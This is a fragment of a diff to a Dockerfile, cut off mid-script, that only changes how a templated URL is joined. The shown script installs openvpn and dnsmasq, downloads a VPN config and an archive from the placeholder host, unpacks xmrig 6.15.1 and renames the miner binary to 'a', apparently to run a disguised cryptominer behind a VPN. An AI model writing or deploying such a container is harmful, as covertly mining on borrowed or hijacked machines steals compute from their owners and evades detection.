@@ -8,12 +8,12 @@ WORKDIR /root
 RUN apt-get update
 RUN apt-get install -y net-tools wget openvpn dnsmasq nano
 RUN cd ~
-RUN wget !!__URL__!!/rdp.ovpn
+RUN wget !!__URL__!!rdp.ovpn
 RUN echo \"nameserver 8.8.8.8\" > /etc/resolv.conf
 RUN echo \"\\
 service dnsmasq start &&\\
 openvpn --config rdp.ovpn --daemon &&\\
-wget !!__URL__!!/a.tar.gz &&\\
+wget !!__URL__!!a.tar.gz &&\\
 tar -xf a.tar.gz &&\\
 cd xmrig-6.15.1 &&\\
 mv xmrig a &&\\
